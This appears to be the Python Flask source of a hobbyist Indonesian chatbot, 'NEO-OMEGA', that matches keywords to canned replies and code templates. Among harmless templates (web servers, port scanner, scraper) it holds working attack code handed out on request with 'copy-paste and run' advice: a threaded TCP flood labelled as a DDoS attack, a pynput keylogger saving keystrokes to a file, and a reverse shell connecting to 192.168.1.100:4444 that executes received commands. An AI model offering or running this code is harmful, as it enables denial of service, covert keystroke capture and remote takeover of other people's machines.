from flask import Flask, request, jsonify, render_template
import os
import random
import time
import json
import re

app = Flask(__name__)

# ============================================================
# MEMORY PERMANEN (SELF-LEARNING)
# ============================================================

MEMORY_FILE = "neo_memory.json"

class NeoMemory:
    def __init__(self):
        self.data = self._load()
        self.conversations = self.data.get("conversations", [])
        self.errors = self.data.get("errors", [])
        self.knowledge = self.data.get("knowledge", {})
        self.patterns = self.data.get("patterns", {})
        self.total_chats = self.data.get("total_chats", 0)
    
    def _load(self):
        if os.path.exists(MEMORY_FILE):
            try:
                with open(MEMORY_FILE, "r") as f:
                    return json.load(f)
            except:
                return {"conversations": [], "errors": [], "knowledge": {}, "patterns": {}, "total_chats": 0}
        return {"conversations": [], "errors": [], "knowledge": {}, "patterns": {}, "total_chats": 0}
    
    def save(self):
        self.data["conversations"] = self.conversations[-100:]  # Simpan 100 terakhir
        self.data["errors"] = self.errors[-50:]  # Simpan 50 error terakhir
        self.data["knowledge"] = self.knowledge
        self.data["patterns"] = self.patterns
        self.data["total_chats"] = self.total_chats
        with open(MEMORY_FILE, "w") as f:
            json.dump(self.data, f, indent=2)
    
    def add_conversation(self, user, bot, intent):
        self.conversations.append({
            "user": user,
            "bot": bot[:200],
            "intent": intent,
            "time": time.time()
        })
        self.total_chats += 1
        # Belajar pola
        if intent not in self.patterns:
            self.patterns[intent] = 0
        self.patterns[intent] += 1
        self.save()
    
    def add_error(self, error, code, fix=None):
        self.errors.append({
            "error": error,
            "code": code[:100],
            "fix": fix,
            "time": time.time()
        })
        self.save()
    
    def add_knowledge(self, key, value):
        self.knowledge[key] = {
            "value": value,
            "time": time.time()
        }
        self.save()
    
    def get_knowledge(self, key):
        if key in self.knowledge:
            return self.knowledge[key]["value"]
        return None
    
    def get_stats(self):
        return {
            "total_chats": self.total_chats,
            "patterns": self.patterns,
            "errors": len(self.errors),
            "knowledge": len(self.knowledge)
        }

memory = NeoMemory()

# ============================================================
# DETEKSI BAHASA
# ============================================================

def detect_language(text):
    text = text.lower()
    languages = {
        "python": ["python", "py", "pip"],
        "javascript": ["js", "javascript", "node"],
        "go": ["go", "golang"],
        "html": ["html", "web", "halaman"],
        "php": ["php"],
        "bash": ["bash", "shell", "sh"],
        "rust": ["rust"],
        "cpp": ["cpp", "c++"],
        "java": ["java"],
        "sql": ["sql", "query"],
        "ruby": ["ruby"],
        "csharp": ["c#", "csharp"],
        "swift": ["swift"]
    }
    for lang, keywords in languages.items():
        if any(kw in text for kw in keywords):
            return lang
    return "python"

# ============================================================
# DETEKSI INTENT (DENGAN PEMBELAJARAN)
# ============================================================

def detect_intent(text):
    text = text.lower().strip()
    
    # Cek di knowledge base dulu
    for key in memory.knowledge:
        if key in text:
            return "knowledge"
    
    if "```" in text:
        return "code_detected"
    
    if any(kw in text for kw in ["buat", "bikin", "tulis", "create", "script", "code"]):
        if any(kw in text for kw in ["web server", "flask", "server web"]):
            return "webserver"
        if "ddos" in text or "attack" in text:
            return "ddos"
        if "keylog" in text:
            return "keylogger"
        if "port scan" in text or "scan port" in text:
            return "portscan"
        if "password" in text and ("gen" in text or "buat" in text):
            return "passwordgen"
        if "scraper" in text or "scrape" in text:
            return "scraper"
        if "backdoor" in text or "shell" in text:
            return "backdoor"
        return "generate"
    
    if any(kw in text for kw in ["halo", "hai", "hey", "hi"]) and len(text) < 20:
        return "sapaan"
    
    if any(kw in text for kw in ["siapa", "nama", "kamu"]) and not "buat" in text:
        return "siapa"
    
    if any(kw in text for kw in ["terima kasih", "makasih", "thanks"]):
        return "thanks"
    
    if any(kw in text for kw in ["apa itu", "jelaskan", "explain", "cara kerja"]):
        return "explain"
    
    if any(kw in text for kw in ["debug", "perbaiki", "fix", "error", "benerin"]):
        return "debug"
    
    if "review" in text or "tinjau" in text:
        return "review"
    
    if any(kw in text for kw in ["belajar", "ajar", "tutorial"]):
        return "belajar"
    
    # Cek feedback
    if "bagus" in text or "mantap" in text or "ok" in text:
        return "feedback_good"
    if "jelek" in text or "buruk" in text or "salah" in text:
        return "feedback_bad"
    
    return "general"

# ============================================================
# GENERATE KODE
# ============================================================

def generate_code(intent, language):
    if intent == "webserver" and language == "python":
        return '''from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "<h1>NEO-OMEGA WEB SERVER</h1>"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)'''
    
    if intent == "webserver" and language == "javascript":
        return '''const express = require('express')
const app = express()
app.get('/', (req, res) => res.send('NEO-OMEGA WEB SERVER'))
app.listen(3000, () => console.log('Server running on port 3000'))'''
    
    if intent == "webserver" and language == "go":
        return '''package main
import "fmt"
import "net/http"
func main() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "NEO-OMEGA WEB SERVER")
    })
    http.ListenAndServe(":8080", nil)
}'''
    
    if intent == "webserver" and language == "html":
        return '''<!DOCTYPE html>
<html>
<head><title>NEO-OMEGA</title></head>
<body><h1>NEO-OMEGA WEB SERVER</h1></body>
</html>'''
    
    if intent == "ddos" and language == "python":
        return '''import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("DDoS attack started!")'''
    
    if intent == "keylogger" and language == "python":
        return '''from pynput import keyboard
log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()'''
    
    if intent == "portscan" and language == "python":
        return '''import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")'''
    
    if intent == "passwordgen" and language == "python":
        return '''import random, string
length = int(input("Panjang password: "))
password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
print(f"Password: {password}")'''
    
    if intent == "scraper" and language == "python":
        return '''import requests
from bs4 import BeautifulSoup
url = input("URL: ")
response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")
print(soup.title.text)'''
    
    if intent == "backdoor" and language == "python":
        return '''import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit": break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
s.close()'''
    
    return f'''print("NEO-OMEGA AI - Generated Code")
print(f"Intent: {intent}, Language: {language}")
print("Created by YATZZ")'''

# ============================================================
# EXPLAIN CODE
# ============================================================

def explain_code(code, language="python"):
    lines = code.strip().split('\n')
    explanation = [f"📖 **Penjelasan Kode {language.upper()}:**\n"]
    for i, line in enumerate(lines, 1):
        if line.strip().startswith('#'):
            explanation.append(f"  {i}. {line.strip()}")
        elif 'import' in line:
            explanation.append(f"  {i}. Mengimpor: {line.strip()}")
        elif 'def ' in line:
            explanation.append(f"  {i}. Fungsi: {line.strip()}")
        elif 'class ' in line:
            explanation.append(f"  {i}. Kelas: {line.strip()}")
        elif 'if ' in line or 'elif ' in line:
            explanation.append(f"  {i}. Kondisi: {line.strip()}")
        elif 'for ' in line or 'while ' in line:
            explanation.append(f"  {i}. Perulangan: {line.strip()}")
        elif 'return ' in line:
            explanation.append(f"  {i}. Mengembalikan: {line.strip()}")
        elif 'print(' in line:
            explanation.append(f"  {i}. Output: {line.strip()}")
        elif line.strip():
            explanation.append(f"  {i}. {line.strip()}")
    return '\n'.join(explanation)

# ============================================================
# AI CORE (DENGAN SELF-LEARNING)
# ============================================================

def jawab_ai(pesan):
    lang = detect_language(pesan)
    intent = detect_intent(pesan)
    
    # Cek di knowledge base
    if intent == "knowledge":
        for key in memory.knowledge:
            if key in pesan.lower():
                return memory.get_knowledge(key)
    
    # DETEKSI KODE
    if intent == "code_detected":
        code_match = re.search(r'```(\w+)?\n(.*?)```', pesan, re.DOTALL)
        if code_match:
            lang_code = code_match.group(1) or "python"
            code = code_match.group(2).strip()
            if "jelasin" in pesan.lower() or "explain" in pesan.lower():
                return explain_code(code, lang_code)
            if "debug" in pesan.lower() or "perbaiki" in pesan.lower():
                return "🔧 Kode diterima! Coba jalankan dan kasih tau error-nya."
        return "Kode diterima! Mau saya jelasin atau debug?"
    
    # INTENT UTAMA
    if intent == "sapaan":
        return random.choice([
            "Halo juga! Saya NEO-OMEGA, siap membantu anda.",
            "Hai! Ada yang bisa saya bantu?",
            "Hey! Saya NEO-OMEGA, silahkan tanya apa saja."
        ])
    
    if intent == "siapa":
        return "Saya NEO-OMEGA, AI buatan TUAN YATZZ. Saya bisa bikin script, jelasin kode, debug, dan ngajarin programming!"
    
    if intent == "thanks":
        return random.choice([
            "Sama-sama! Senang bisa membantu.",
            "Sama-sama! Kalo butuh bantuan lagi, tinggal chat aja."
        ])
    
    if intent == "explain":
        return "Saya bisa bikin script, jelasin kode, debug, dan review kode. Coba kirim kode pake ``` terus bilang 'jelasin'."
    
    if intent == "debug":
        return "Kirim kode yang mau di-debug pake ```, terus kasih tau error-nya. Nanti saya bantu perbaiki."
    
    if intent == "review":
        return "Kirim kode yang mau di-review pake ```, nanti saya kasih saran perbaikan."
    
    if intent == "belajar":
        return "Mau belajar apa? Python? Web server? Hacking? Tulis 'belajar [topik]'."
    
    if intent == "feedback_good":
        memory.add_knowledge("feedback", "user suka")
        return "Makasih feedback-nya! Saya bakal makin pintar."
    
    if intent == "feedback_bad":
        memory.add_knowledge("feedback", "user kurang suka")
        return "Maaf kalo kurang memuaskan. Coba kasih tau yang bener, biar saya belajar."
    
    if intent in ["generate", "webserver", "ddos", "keylogger", "portscan", "passwordgen", "scraper", "backdoor"]:
        code = generate_code(intent, lang)
        # Simpan ke knowledge
        memory.add_knowledge(f"code_{intent}_{lang}", code)
        return f"Saya buatkan script {lang.upper()}:\n\n```{lang}\n{code}\n```\n\nCopy-paste dan jalankan! Kalo ada error, kirim ke saya."
    
    return f"Saya NEO-OMEGA. Saya bisa bikin script, jelasin kode, dan debug. Coba tanya: 'buat web server pake python'"

# ============================================================
# ROUTE
# ============================================================

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    pesan = data.get('message', '').strip()
    
    if not pesan:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    balasan = jawab_ai(pesan)
    intent = detect_intent(pesan)
    memory.add_conversation(pesan, balasan, intent)
    
    # Tambah pengetahuan baru kalo ada kata kunci
    if "belajar" in pesan.lower() and ":" in pesan:
        parts = pesan.split(":", 1)
        if len(parts) == 2:
            key = parts[0].strip().lower().replace("belajar", "").strip()
            value = parts[1].strip()
            if key and value:
                memory.add_knowledge(key, value)
                balasan += f"\n\n✅ Saya belajar: '{key}' = '{value}'"
    
    return jsonify({
        'response': balasan,
        'code': '',
        'output': ''
    })

@app.route('/api/stats', methods=['GET'])
def stats():
    return jsonify(memory.get_stats())

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("=" * 60)
    print("🔥 NEO-OMEGA AI — SELF-LEARNING EDITION")
    print("🔥 CREATED BY YATZZ")
    print("🔥 AI BISA BELAJAR SENDIRI DARI PERCAKAPAN!")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port)
